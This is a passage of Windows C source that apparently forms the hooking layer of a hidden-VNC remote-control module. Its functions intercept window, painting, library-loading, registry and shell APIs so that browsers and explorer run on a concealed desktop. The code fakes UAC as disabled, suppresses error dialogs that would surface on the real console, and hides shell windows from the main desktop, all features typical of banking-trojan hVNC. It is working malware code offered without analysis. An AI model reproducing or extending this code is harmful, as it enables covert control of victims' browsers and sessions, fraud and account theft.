		r = DEFINE_U32_PROC(FlashWindowEx)(pfwi);
	}

	LEAVE_HOOK();
	return r;
}

BOOL WINAPI my_FlashWindow(HWND hWnd,BOOL bInvert)
{
	BOOL r;
	ENTER_HOOK();

	if ( g_VncSharedSection.Data ){
		r = TRUE;
	}else{
		r = DEFINE_U32_PROC(FlashWindow)(hWnd,bInvert);
	}
	LEAVE_HOOK();
	return r;
}

HWND WINAPI my_SetCapture(HWND hWnd)
{
	HWND r = NULL;
	ENTER_HOOK();

	if ( g_VncSharedSection.Data )
	{
		// workaround for crash in ie!mshtml
		// when mshtml can't get DOC from window and crashes
		if ( BR_IsIE() )
		{
			r = DEFINE_U32_PROC(SetCapture)(hWnd);
		}
		else
		{
			if (!hWnd)
			{
				r = MouseChangeCapture(g_pSession,0,NULL,HTNOWHERE,FALSE);
			}
			else
			{
				DWORD dwThreadID = GetCurrentThreadId();
				if (dwThreadID == GetWindowThreadProcessId(hWnd,NULL)){
					r = MouseChangeCapture(g_pSession,dwThreadID,hWnd,HTNOWHERE,FALSE);
				}else{
					r = NULL;
				}
			}
		}
	}else{
		r = DEFINE_U32_PROC(SetCapture)(hWnd);
	}
	LEAVE_HOOK();
	return r;
}

BOOL WINAPI my_ReleaseCapture(VOID)
{
	BOOL r = FALSE;
	DWORD dwCapturedThreadID = 0;

	ENTER_HOOK();

	if ( g_VncSharedSection.Data )
	{
		// workaround for crash in ie!mshtml
		// when mshtml can't get DOC from window and crashes
		if ( BR_IsIE() )
		{
			r = DEFINE_U32_PROC(ReleaseCapture)();
		}
		else
		{
			dwCapturedThreadID = g_VncSharedSection.Data->dwCapturedThreadID;
			if ( dwCapturedThreadID == GetCurrentThreadId())
			{
				MouseReleaseCapture(g_pSession);
				r = TRUE;
			}else{
				SetLastError(ERROR_ACCESS_DENIED);
				r = FALSE;
			}
		}
	}else{
		r = DEFINE_U32_PROC(ReleaseCapture)();
	}
	LEAVE_HOOK();
	return r;
}

HWND WINAPI my_GetCapture(void)
{
	HWND r = NULL;
	DWORD dwCapturedThreadID = 0;
	ENTER_HOOK();

	if ( g_VncSharedSection.Data )
	{
		// workaround for crash in ie!mshtml
		// when mshtml can't get DOC from window and crashes
		if ( BR_IsIE() )
		{
			r = DEFINE_U32_PROC(GetCapture)();
		}
		else
		{
			dwCapturedThreadID = g_VncSharedSection.Data->dwCapturedThreadID;
			if ( dwCapturedThreadID == GetCurrentThreadId())
			{
				r = g_VncSharedSection.Data->hCapturedWnd;
				if ((r) && (!IsWindow(r))){
					MouseChangeCapture(g_pSession,0,NULL,HTNOWHERE,FALSE);
					r = NULL;
				}
			}
		}
	}
	else
	{
		r = DEFINE_U32_PROC(GetCapture)();
	}

	LEAVE_HOOK();
	return r;
}

int WINAPI 
	my_SetDIBitsToDevice(
		HDC hdc,
		int xDest,int yDest,
		DWORD w,DWORD h,
		int xSrc,int ySrc,
		UINT StartScan,
		UINT cLines,
		CONST VOID *lpvBits,
		CONST BITMAPINFO *lpbmi,
		UINT ColorUse
		)
{
	int result;
	HWND hWnd;
	ENTER_HOOK();

	hWnd=WindowFromDC(hdc);
	if ( hWnd )
	{
		POINT ptOrigin;
		HRGN Clip;

		JavaPaintHook *pjhd = LookupJavaHook( hWnd );

		if ( pjhd != NULL ){

			WaitForSingleObject(pjhd->hMutex,INFINITE);

			Clip = CreateRectRgn(1,1,1,1);
			if (GetClipRgn(hdc,Clip) == 1){
				SelectClipRgn(pjhd->hDC,Clip);
			}
			DeleteObject(Clip);
			GetViewportOrgEx(hdc,&ptOrigin);
			SetViewportOrgEx(pjhd->hDC,ptOrigin.x,ptOrigin.y,NULL);

			DbgPrint("my_SetDIBitsToDevice on %p \n",hWnd);

			result = 
				DEFINE_G32_PROC(SetDIBitsToDevice)(
					pjhd->hDC,
					xDest,yDest,
					w,h,
					xSrc,ySrc,
					StartScan,cLines,
					lpvBits,
					lpbmi,
					ColorUse
					);
			ReleaseMutex(pjhd->hMutex);
			LEAVE_HOOK();
			return result;
		}else{
			DbgPrint("HOOK is NULL\n");
		}
	}else{
		DbgPrint("nWnd is NULL\n");
	}
	result = DEFINE_G32_PROC(SetDIBitsToDevice)(hdc,xDest,yDest,w,h,xSrc,ySrc,StartScan,cLines,lpvBits,lpbmi,ColorUse);
	LEAVE_HOOK();
	return result;
}

BOOL WINAPI my_BitBlt( HDC hdc, int x, int y, int cx, int cy, HDC hdcSrc, int x1, int y1, DWORD rop)
{
	int result;
	HWND hWnd;
	ENTER_HOOK();

	hWnd=WindowFromDC(hdc);
	if ( hWnd )
	{
		POINT ptOrigin;
		HRGN Clip;
		JavaPaintHook *pjhd = LookupJavaHook( hWnd );

		if ( pjhd != NULL ){

			WaitForSingleObject(pjhd->hMutex,INFINITE);

			if ( pjhd->UpdateViewPort )
			{
				Clip = CreateRectRgn(1,1,1,1);
				if (GetClipRgn(hdc,Clip) == 1){
					SelectClipRgn(pjhd->hDC,Clip);
				}
				DeleteObject(Clip);
				GetViewportOrgEx(hdc,&ptOrigin);
				SetViewportOrgEx(pjhd->hDC,ptOrigin.x,ptOrigin.y,NULL);
			}

			result = DEFINE_G32_PROC(BitBlt)(pjhd->hDC,x, y, cx, cy, hdcSrc, x1, y1, rop);
			ReleaseMutex(pjhd->hMutex);
			LEAVE_HOOK();
			return result;
		}
	}
	result = DEFINE_G32_PROC(BitBlt)(hdc,x, y, cx, cy, hdcSrc, x1, y1, rop);
	LEAVE_HOOK();
	return result;
}

BOOL WINAPI my_TrackPopupMenuEx(HMENU hmenu,UINT fuFlags,int x,int y,HWND hwnd,LPTPMPARAMS lptpm)
{
	BOOL r;
	ENTER_HOOK();

	if ( g_VncSharedSection.Data && 
		(g_VncSharedSection.Data->bTrayIconUnderCursor) && 
		((hwnd == g_pSession->Desktop.hTrayWnd) || (hwnd == g_pSession->Desktop.hOverflowIconWindow)))
	{
		LEAVE_HOOK();
		return TRUE;
	}
	r = DEFINE_U32_PROC(TrackPopupMenuEx)(hmenu,fuFlags,x,y,hwnd,lptpm);

	LEAVE_HOOK();
	return r;
}

UINT WINAPI my_GetCaretBlinkTime( VOID )
{
	return INFINITE;
}

BOOL WINAPI my_TranslateMessage(LPMSG Msg)
{
	BOOL r;
	ENTER_HOOK();

	if ( g_VncSharedSection.Data ){
		if (!IsTranslateMessageUsed(Msg->hwnd))
			AppendWnd(Msg->hwnd);
	}

	r = DEFINE_U32_PROC(TranslateMessage)(Msg);

	LEAVE_HOOK();
	return r;
}
//////////////////////////////////////////////////////////////////////////
#define DLL_REQURED_BY_IE 1
typedef struct _DLL_STRINGS
{
	LPWSTR Name;
	ULONG Flags;
}DLL_STRINGS,*PDLL_STRINGS;

struct _DLL_STRINGS g_BlockedDllList[] = 
{
	{ L"d3d10_1.dll", DLL_REQURED_BY_IE },// required by IE
	{ L"d3d10_1core.dll", DLL_REQURED_BY_IE }, // required by IE
	{ L"d3d10.dll", DLL_REQURED_BY_IE }, // required by IE
	{ L"d3d10core.dll", DLL_REQURED_BY_IE }, // required by IE

	{ L"d2d1.dll", DLL_REQURED_BY_IE }, // required by IE

	{ L"OPENGL32.dll", 0 },
	{ L"d3d9.dll", 0 },
	{ L"d3d11.dll", 0 },
	{ L"Dxtrans.dll", 0 },
	{ L"Flash6.ocx", 0 },

	{ NULL, 0 }
};

BOOL _CanLoadLibrary(LPCWSTR lpFileName, BOOL bIE )
{
	unsigned i = 0;
	BOOL fbResult = TRUE;
	LPCWSTR FileShortName = wcsrchr(lpFileName, L'\\');
	if ( FileShortName ){
		FileShortName++;
	}else if (!bIE){
		FileShortName = lpFileName;
	}

	if ( FileShortName ){
		for ( i = 0; g_BlockedDllList[i].Name!= NULL; i++)
		{
			if (( lstrcmpiW(FileShortName,g_BlockedDllList[i].Name) == 0 ))
			{
				if ( !bIE )
				{
					fbResult = FALSE;
				}
				else if( (g_BlockedDllList[i].Flags & DLL_REQURED_BY_IE ) != DLL_REQURED_BY_IE )
				{
					fbResult = FALSE;
				}
				break;
			}
		}
	}
	return fbResult;
}

HMODULE WINAPI my_LoadLibraryA(LPCSTR lpFileName)
{
	HMODULE r = NULL;
	USES_CONVERSION;

	ENTER_HOOK();

	if (lpFileName && (BR_IsBrowser() || g_bIsShell))
	{
		if (!_CanLoadLibrary(A2W(lpFileName),BR_IsIE()))
		{
			SetLastError(ERROR_FILE_NOT_FOUND);
			LEAVE_HOOK();
			return NULL;
		}
	}

	r = DEFINE_K32_PROC(LoadLibraryA)(lpFileName);
	LEAVE_HOOK();
	return r;
}
HMODULE WINAPI my_LoadLibraryW(LPCWSTR lpFileName)
{
	HMODULE r = NULL;
	
	ENTER_HOOK();

	if (lpFileName && (BR_IsBrowser() || g_bIsShell))
	{
		if (!_CanLoadLibrary(lpFileName,BR_IsIE()))
		{
			SetLastError(ERROR_FILE_NOT_FOUND);
			LEAVE_HOOK();
			return NULL;
		}
	}

	r = DEFINE_K32_PROC(LoadLibraryW)(lpFileName);
	LEAVE_HOOK();
	return r;
}

HMODULE WINAPI my_LoadLibraryExA(
	LPCSTR lpFileName,
	HANDLE hFile,
	DWORD dwFlags
	)
{
	HMODULE r = NULL;
	USES_CONVERSION;

	ENTER_HOOK();

	if (lpFileName && (BR_IsBrowser() || g_bIsShell))
	{
		if (!_CanLoadLibrary(A2W(lpFileName),BR_IsIE()))
		{
			SetLastError(ERROR_FILE_NOT_FOUND);
			LEAVE_HOOK();
			return NULL;
		}
	}

	r = DEFINE_K32_PROC(LoadLibraryExA)(lpFileName,hFile,dwFlags);
	LEAVE_HOOK();
	return r;
}

HMODULE WINAPI my_LoadLibraryExW(
	LPCWSTR lpFileName,
	HANDLE hFile,
	DWORD dwFlags
	)
{
	HMODULE r = NULL;
	ENTER_HOOK();

	if (lpFileName && (BR_IsBrowser() || g_bIsShell))
	{
		if (!_CanLoadLibrary(lpFileName,BR_IsIE()))
		{
			SetLastError(ERROR_FILE_NOT_FOUND);
			LEAVE_HOOK();
			return NULL;
		}
	}

	r = DEFINE_K32_PROC(LoadLibraryExW)(lpFileName,hFile,dwFlags);
	LEAVE_HOOK();
	return r;
}



FARPROC WINAPI my_GetProcAddress( HMODULE hModule, LPCSTR lpProcName )
{
	DWORD Ord = (DWORD)(DWORD_PTR)lpProcName;
	FARPROC r = NULL;
	ENTER_HOOK();

	if ( (BR_IsFF() || BR_IsOPR() ) && HIWORD(Ord) && 
		(( _stricmp(lpProcName,"CreateDXGIFactory1") == 0 ) ||
		( _stricmp(lpProcName,"D3D10CreateDevice1") == 0 ) ||
		( _stricmp(lpProcName,"Direct3DCreate9") == 0 ) ||
		( _stricmp(lpProcName,"Direct3DCreate9Ex") == 0 )))
	{
		r = NULL;
	}
	else
	{
		r = DEFINE_K32_PROC(GetProcAddress)(hModule,lpProcName);
	}
	LEAVE_HOOK();
	return r;
}

//////////////////////////////////////////////////////////////////////////
// REGISTRY HOOKS
// we need to virtualize some system settings
// 1. UAC is off
//    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
//    DWORD:EnableLUA=0

LONG WINAPI my_RegQueryValueExW(
	IN HKEY hKey,
	IN LPCWSTR lpValueName,
	IN LPDWORD lpReserved,
	OUT LPDWORD lpType,
	OUT LPBYTE lpData,
	OUT LPDWORD lpcbData
	)
{
	LONG r = NO_ERROR;
	BOOL bCallOrig;
	CHAR SystemMajor = LOBYTE(LOWORD(g_SystemVersion));
	CHAR SystemMinor = HIBYTE(LOWORD(g_SystemVersion));
	ptr_RegQueryValueExW Func_RegQueryValueExW;

	ENTER_HOOK();

	bCallOrig = 
		RegQueryValueExW_Before(
			hKey,
			NULL,
			(LPWSTR)lpValueName,
			lpType,
			lpData,
			lpcbData,
			&r,
			BR_IsIE(), 
			g_bIsShell
			);
	if ( !bCallOrig )
	{
		LEAVE_HOOK();
		return r;
	}

	// Calling function by the pointer that was saved while we were setting hooks.
	//	This is because we import ADVAPI32 as delay import and addresses of it's functions are being resolved after the
	//	hooks were set so they can point to our hook functions instead of original ones.
	if (SystemMajor > 6 || ( SystemMajor == 6 && SystemMinor > 1)) // win8
	{
		// Win8
		Func_RegQueryValueExW = (ptr_RegQueryValueExW) hook_KernelBase_RegQueryValueExW.Original;
	}
	else if ( SystemMajor == 6 && SystemMinor == 1 ) // win7
	{
		// Win7
		Func_RegQueryValueExW = DEFINE_K32_PROC(RegQueryValueExW);
	}
	else
	{
		Func_RegQueryValueExW = DEFINE_A32_PROC(RegQueryValueExW);
	}

	r = 
		Func_RegQueryValueExW(
			hKey,
			lpValueName,
			lpReserved,
			lpType,
			lpData,
			lpcbData
			);

	LEAVE_HOOK();
	return r;
}

LONG WINAPI 
	my_RegGetValueW(
		HKEY    hkey,
		LPCWSTR  lpSubKey,
		LPCWSTR  lpValue,
		DWORD    dwFlags,
		LPDWORD pdwType,
		PVOID   pvData,
		LPDWORD pcbData 
		)
{
	LONG r = NO_ERROR;
	BOOL bCallOrig;
	CHAR SystemMajor = LOBYTE(LOWORD(g_SystemVersion));
	CHAR SystemMinor = HIBYTE(LOWORD(g_SystemVersion));
	ptr_RegGetValueW Func_RegGetValueW;

	ENTER_HOOK();

	bCallOrig = 
		RegQueryValueExW_Before(
			hkey,
			(LPWSTR)lpSubKey,
			(LPWSTR)lpValue,
			pdwType,
			pvData,
			pcbData,
			&r,
			BR_IsIE(), 
			g_bIsShell
			);
	if ( !bCallOrig )
	{
		LEAVE_HOOK();
		return r;
	}

	// Calling function by the pointer that was saved while we were setting hooks.
	//	This is because we import ADVAPI32 as delay import and addresses of it's functions are being resolved after the
	//	hooks were set so they can point to our hook functions instead of original ones.
	if (SystemMajor > 6 || ( SystemMajor == 6 && SystemMinor > 1)) // win8
	{
		// Win8
		Func_RegGetValueW = (ptr_RegGetValueW) hook_KernelBase_RegGetValueW.Original;
	}
	else if ( SystemMajor == 6 && SystemMinor == 1 ) // win7
	{
		// Win7
		Func_RegGetValueW = DEFINE_K32_PROC(RegGetValueW);
	}
	else
	{
		Func_RegGetValueW = DEFINE_A32_PROC(RegGetValueW);
	}

	r = 
		Func_RegGetValueW(
			hkey,
			lpSubKey,
			lpValue,
			dwFlags,
			pdwType,
			pvData,
			pcbData 
			);

	LEAVE_HOOK();
	return r;
}
//////////////////////////////////////////////////////////////////////////
// we disable hard error on the desktop because it affects root console
// NtRaiseHardError
LONG WINAPI my_NtRaiseHardError(
		IN LONG ErrorStatus, 
		IN ULONG NumberOfParameters, 
		IN PVOID UnicodeStringParameterMask OPTIONAL, 
		IN PVOID *Parameters, 
		IN HARDERROR_RESPONSE_OPTION ResponseOption, 
		OUT PHARDERROR_RESPONSE Response 
		) 
{
	return 0xC0000022L; //STATUS_ACCESS_DENIED
}
// disable theme service access
// NtConnectPort
LONG WINAPI my_NtConnectPort (
    OUT PHANDLE PortHandle,
    IN PUNICODE_STRING PortName,
    IN PVOID SecurityQos,
    IN OUT PVOID ClientView OPTIONAL,
    IN OUT PVOID ServerView OPTIONAL,
    OUT PULONG MaxMessageLength OPTIONAL,
    IN OUT PVOID ConnectionInformation OPTIONAL,
    IN OUT PULONG ConnectionInformationLength OPTIONAL
    )
{
	LONG ntStatus = 0xC0000034L; //STATUS_OBJECT_NAME_NOT_FOUND
	UNICODE_STRING usThemeApiPort;
	ENTER_HOOK();

	RtlInitUnicodeString(&usThemeApiPort,L"\\ThemeApiPort");
	if ( /*IsXP() &&*/ !BR_IsIE() && RtlCompareUnicodeString(&usThemeApiPort,PortName,TRUE) == 0 ){
		ntStatus = 0xC0000034L;
	}
	else
	{
		ntStatus = 
			DEFINE_NT_PROC(NtConnectPort)(
				PortHandle,
				PortName,
				SecurityQos,
				ClientView,
				ServerView,
				MaxMessageLength,
				ConnectionInformation,
				ConnectionInformationLength
				);
	}
	return ntStatus;
}


//////////////////////////////////////////////////////////////////////////
// user32!SetShellWindow hook
// SetShellWindow notifies win32k about new shell window
// win32k remembers shell process id
// and if the shell process terminates, win32k sends the message to winlogon
// to restart the shell
// because of this on the main desktop new explorer window appears.
BOOL WINAPI my_SetShellWindow(HWND hwnd)
{
	BOOL r = TRUE;
	ENTER_HOOK();
	if ( g_VncSharedSection.Data )
	{
		g_VncSharedSection.Data->hShellWnd = hwnd;
	}else{
		r = DEFINE_U32_PROC(SetShellWindow)(hwnd);
	}
	LEAVE_HOOK();
	return r;
}

BOOL WINAPI my_SetShellWindowEx(HWND hwnd, HWND hListView)
{
	BOOL r = TRUE;
	ENTER_HOOK();
	if ( g_VncSharedSection.Data )
	{
		g_VncSharedSection.Data->hShellWnd = hwnd;
	}else{
		r = DEFINE_U32_PROC(SetShellWindowEx)(hwnd,hListView);
	}
	LEAVE_HOOK();
	return r;
}

HWND WINAPI my_GetShellWindow ( VOID )
{
	HWND hwnd = NULL;

	ENTER_HOOK();
	if ( g_VncSharedSection.Data ){
		hwnd = g_VncSharedSection.Data->hShellWnd;
	}else{
		hwnd = DEFINE_U32_PROC(GetShellWindow)();
	}
	LEAVE_HOOK();

	return hwnd;
}

//////////////////////////////////////////////////////////////////////////
// user32!SetTaskmanWindow hook
// win32k uses taksman wnd for taskman/tray notifications
// it breaks minimizing windows to task bar in host session  

BOOL WINAPI my_SetTaskmanWindow(HWND hwnd)
{
	BOOL r = TRUE;
	ENTER_HOOK();
	if ( g_VncSharedSection.Data )
	{
		g_VncSharedSection.Data->hTaskmanWnd = hwnd;
	}else{
		r = DEFINE_U32_PROC(SetShellWindow)(hwnd);
	}
	LEAVE_HOOK();
	return r;
}

HWND WINAPI my_GetTaskmanWindow( VOID )
{
	HWND hwnd = NULL;

	ENTER_HOOK();
	if ( g_VncSharedSection.Data ){
		hwnd = g_VncSharedSection.Data->hTaskmanWnd;
	}else{
		hwnd = DEFINE_U32_PROC(GetTaskmanWindow)();
	}
	LEAVE_HOOK();

	return hwnd;
}

//////////////////////////////////////////////////////////////////////////
// user32!SetProgmanWindow hook
// win32k uses taksman wnd for taskman/tray notifications
// it breaks minimizing windows to task bar in host session  

BOOL WINAPI my_SetProgmanWindow(HWND hwnd)
{
	BOOL r = TRUE;
	ENTER_HOOK();
	if ( g_VncSharedSection.Data )
	{
		g_VncSharedSection.Data->hProgmanWnd = hwnd;
	}else{
		r = DEFINE_U32_PROC(SetProgmanWindow)(hwnd);
	}
	LEAVE_HOOK();
	return r;
}

HWND WINAPI my_GetProgmanWindow( VOID )
{
	HWND hwnd = NULL;

	ENTER_HOOK();
	if ( g_VncSharedSection.Data ){
		hwnd = g_VncSharedSection.Data->hProgmanWnd;
	}else{
		hwnd = DEFINE_U32_PROC(GetProgmanWindow)();
	}
	LEAVE_HOOK();

	return hwnd;
}

#ifndef SPI_GETCLIENTAREAANIMATION
#define SPI_GETDISABLEOVERLAPPEDCONTENT     0x1040
#define SPI_GETCLIENTAREAANIMATION          0x1042
#endif

BOOL WINAPI my_SystemParametersInfoW(
	UINT uiAction,
	UINT uiParam,
	PVOID pvParam,
	UINT fWinIni
	)
{
	BOOL r;

	ENTER_HOOK();
	r = DEFINE_U32_PROC(SystemParametersInfoW)(uiAction,uiParam,pvParam,fWinIni);
	if ( r && uiAction != SPI_GETHIGHCONTRAST )
	{
		switch ( uiAction )
		{
		case SPI_GETCLIENTAREAANIMATION:
		case SPI_GETCOMBOBOXANIMATION:
		case SPI_GETCURSORSHADOW:
		case SPI_GETDRAGFULLWINDOWS:
		case SPI_GETDROPSHADOW:
		case SPI_GETFONTSMOOTHING:
		case SPI_GETLISTBOXSMOOTHSCROLLING:
		case SPI_GETMENUANIMATION:
		case SPI_GETSELECTIONFADE:
		case SPI_GETTOOLTIPANIMATION:
			if ( pvParam ){
				*((PBOOL)pvParam) = FALSE;
			}
			break;
		case SPI_GETDISABLEOVERLAPPEDCONTENT:
			if ( pvParam ){
				*((PBOOL)pvParam) = TRUE;
			}
			break;
		case SPI_GETANIMATION:
			{
				LPANIMATIONINFO Info = (LPANIMATIONINFO)pvParam;

				//DbgPrint("fixing system param SPI_GETANIMATION\n");
				Info->iMinAnimate = 0;
			}
			break;
		}
	}
	LEAVE_HOOK();

	return r;
}

BOOL WINAPI my_SystemParametersInfoA(
	UINT uiAction,
	UINT uiParam,
	PVOID pvParam,
	UINT fWinIni
	)
{
	BOOL r;

	ENTER_HOOK();
	r = DEFINE_U32_PROC(SystemParametersInfoA)(uiAction,uiParam,pvParam,fWinIni);
	if ( r )
	{
		switch ( uiAction )
		{
		case SPI_GETCLIENTAREAANIMATION:
		case SPI_GETCOMBOBOXANIMATION:
		case SPI_GETCURSORSHADOW:
		case SPI_GETDRAGFULLWINDOWS:
		case SPI_GETDROPSHADOW:
		case SPI_GETFONTSMOOTHING:
		case SPI_GETLISTBOXSMOOTHSCROLLING:
		case SPI_GETMENUANIMATION:
		case SPI_GETSELECTIONFADE:
		case SPI_GETTOOLTIPANIMATION:
			if ( pvParam ){
				*((PBOOL)pvParam) = FALSE;
			}
			break;
		case SPI_GETDISABLEOVERLAPPEDCONTENT:
			if ( pvParam ){
				*((PBOOL)pvParam) = TRUE;
			}
			break;
		case SPI_GETANIMATION:
			{
				LPANIMATIONINFO Info = (LPANIMATIONINFO)pvParam;
				Info->iMinAnimate = 0;
			}
			break;
		}
	}
	LEAVE_HOOK();

	return r;
}

// we force explorer browse in single process
DWORD __stdcall my_SHRestricted(IN LONG rest)
{
	HRESULT r;
	ENTER_HOOK();
	if ( rest != REST_SEPARATEDESKTOPPROCESS )
	{
		r = DEFINE_SHELL32_PROC(SHRestricted)(rest);
	}else{
		r = 0;
	}

	LEAVE_HOOK();

	return r;
}
void __stdcall my_SHGetSetSettings( PVOID ptr, DWORD dwMask, BOOL bSet )
{
	LPSHELLSTATE lpss = (LPSHELLSTATE)ptr;
	ENTER_HOOK();

	DEFINE_SHELL32_PROC(SHGetSetSettings)(lpss,dwMask,bSet);

	if ( !bSet && lpss ){
		lpss->fSepProcess = FALSE;
	}

	LEAVE_HOOK();
}

// disable visual effects
void __stdcall my_SetThemeAppProperties(DWORD dwFlags)
{
	ENTER_HOOK();

	DEFINE_UXTHEME_PROC(SetThemeAppProperties)(0);
	LEAVE_HOOK();
}

WINERROR VncHookActivate(VOID)
{
	WINERROR Status = NO_ERROR;
	LONG NumberIatHooks;
	LONG NumberExportHooks;
	PHOOK_DESCRIPTOR ExportHooks;
	PHOOK_DESCRIPTOR IatHooks;

	CHAR SystemMajor = LOBYTE(LOWORD(g_SystemVersion));
	CHAR SystemMinor = HIBYTE(LOWORD(g_SystemVersion));

	DbgPrint("=>\n");

	// set common hooks
	ExportHooks = (PHOOK_DESCRIPTOR)&g_WndExpHooks;
	IatHooks = (PHOOK_DESCRIPTOR)&g_WndIatHooks;
	NumberExportHooks = sizeof(g_WndExpHooks) / sizeof(HOOK_DESCRIPTOR);
	NumberIatHooks = sizeof(g_WndIatHooks) / sizeof(HOOK_DESCRIPTOR);

	Status = 
		SetMultipleDllHooks(
			IatHooks,
			NumberIatHooks,
			ExportHooks,
			NumberExportHooks
			);

	if ( Status == NO_ERROR )
	{
		ExportHooks = IatHooks = NULL;
		// system specific
		if (SystemMajor > 6 || (SystemMajor == 6 && SystemMinor > 1)) // win8
		{
			// Windows 7 and higher
			ExportHooks = (PHOOK_DESCRIPTOR)&g_WndExpHooks8;
			IatHooks = (PHOOK_DESCRIPTOR)&g_WndIatHooks8;
			NumberExportHooks = sizeof(g_WndExpHooks8) / sizeof(HOOK_DESCRIPTOR);
			NumberIatHooks = sizeof(g_WndIatHooks8) / sizeof(HOOK_DESCRIPTOR);
		}
		else if ( SystemMajor == 6 && SystemMinor == 1 ) // win7
		{
			// Windows 7 and higher
			ExportHooks = (PHOOK_DESCRIPTOR)&g_WndExpHooks7;
			IatHooks = (PHOOK_DESCRIPTOR)&g_WndIatHooks7;
			NumberExportHooks = sizeof(g_WndExpHooks7) / sizeof(HOOK_DESCRIPTOR);
			NumberIatHooks = sizeof(g_WndIatHooks7) / sizeof(HOOK_DESCRIPTOR);
		}
		else // vista and below
		{
			// Windows Vista and lower
			ExportHooks = (PHOOK_DESCRIPTOR)&g_WndExpHooksXP;
			IatHooks = (PHOOK_DESCRIPTOR)&g_WndIatHooksXP;
			NumberExportHooks = sizeof(g_WndExpHooksXP) / sizeof(HOOK_DESCRIPTOR);
			NumberIatHooks = sizeof(g_WndIatHooksXP) / sizeof(HOOK_DESCRIPTOR);
		}

		if ( ExportHooks && IatHooks ){
			Status = 
				SetMultipleDllHooks(
					IatHooks,
					NumberIatHooks,
					ExportHooks,
					NumberExportHooks
					);
		}

		if (Status != NO_ERROR){
			DbgPrint("SetMultipleDllHooks 2 failed status=%lu\n",Status);
			RemoveMultipleHooks(ExportHooks, NumberExportHooks);
			RemoveMultipleHooks((PHOOK_DESCRIPTOR)&g_WndIatHooks, sizeof(g_WndIatHooks) / sizeof(HOOK_DESCRIPTOR));
			RemoveMultipleHooks((PHOOK_DESCRIPTOR)&g_WndExpHooks, sizeof(g_WndExpHooks) / sizeof(HOOK_DESCRIPTOR));
		}else{
			// set come shell specific hooks
			if ( g_bIsShell )
			{
				//TEST
				//Sleep ( 10000 );
				if ( ShellHookActivate() == NO_ERROR ){
					StartMenuStart(g_pSession);
				}
			}
		}
	}
	return(Status);
}
